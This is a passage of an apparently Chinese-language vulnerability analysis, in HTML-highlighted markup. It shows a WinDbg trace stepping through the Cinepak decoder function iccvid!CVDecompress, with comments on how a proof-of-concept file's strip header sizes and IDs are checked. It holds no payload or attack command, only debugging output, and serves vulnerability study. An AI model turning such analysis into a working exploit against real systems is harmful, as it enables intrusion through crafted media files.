class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x95</span>:</span><br><span class="line">73b72243 8b45f0          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">10h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd20=0000005e <span class="comment">; 未解压缩的数据长度，开始时等于PoC中cinepak_codec_data2和idx_tag字节数之和</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72246 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x98</span>:</span><br><span class="line">73b72246 83f816          <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="number">16h</span>                                        <span class="comment">; 判断未解压的数据长度是否小于0x16,</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72249 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x9b</span>:</span><br><span class="line">73b72249 0f829b010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=025afd20 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7224f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa1</span>:</span><br><span class="line">73b7224f 0fb65603        <span class="keyword">movzx</span>   <span class="built_in">edx</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6905=<span class="number">10</span> <span class="comment">; edx = 0x10,Size of strip data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=0000005e <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72253 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa5</span>:</span><br><span class="line">73b72253 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72255 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xa7</span>:</span><br><span class="line">73b72255 8a6e01          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6903=<span class="number">00</span> <span class="comment">; ch = 0x00,Strip CVID ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72258 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xaa</span>:</span><br><span class="line">73b72258 8a4e02          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6904=<span class="number">00</span> <span class="comment">; cl = 0x00,Size of strip data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xad</span>:</span><br><span class="line">73b7225b c1e108          <span class="keyword">shl</span>     <span class="built_in">ecx</span>,<span class="number">8</span>                                          <span class="comment">; ecx = 0x00000000,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7225e <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb0</span>:</span><br><span class="line">73b7225e 0bca            <span class="keyword">or</span>      <span class="built_in">ecx</span>,<span class="built_in">edx</span>                                        <span class="comment">; 以大端读取Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72260 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb2</span>:</span><br><span class="line">73b72260 3bc1            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                        <span class="comment">; 判断未解压缩的数据长度是否大于Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72262 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb4</span>:</span><br><span class="line">73b72262 894df8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000004</span> <span class="comment">; [ebp-8] = ecx = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72265 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xb7</span>:</span><br><span class="line">73b72265 0f827f010000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x23c</span> (73b723ea)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=0000005e <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226b <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbd</span>:</span><br><span class="line">73b7226b 8a06            <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]          <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6902=<span class="number">10</span> <span class="comment">; al = 0x10,Strip CVID ID的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226d <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbf</span>:</span><br><span class="line">73b7226d 3c10            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">10h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x10</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc1</span>:</span><br><span class="line">73b7226f <span class="number">7408</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0xcb</span> (73b72279)     [br=<span class="number">1</span>] <span class="comment">; 相等则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72279 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcb</span>:</span><br><span class="line">73b72279 8d4508          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]                                    <span class="comment">; eax = 0x025afd38,a1地址,a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xce</span>:</span><br><span class="line">73b7227c <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg3 = eax = 0x025afd38,保存减去Strip Header大小后的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227d <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcf</span>:</span><br><span class="line">73b7227d 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span>                                            <span class="comment">; arg2 = 0xC,Strip Header大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227f <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd1</span>:</span><br><span class="line">73b7227f ff75f8          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; arg1 = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72282 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd4</span>:</span><br><span class="line">73b72282 e8fffeffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72287 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd9</span>:</span><br><span class="line">73b72287 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72289 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xdb</span>:</span><br><span class="line">73b72289 0f8c65010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7228f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe1</span>:</span><br><span class="line">73b7228f 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72291 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe3</span>:</span><br><span class="line">73b72291 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690a=<span class="number">00</span> <span class="comment">; ah = 0x00,Strips bottom Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72294 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe6</span>:</span><br><span class="line">73b72294 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span 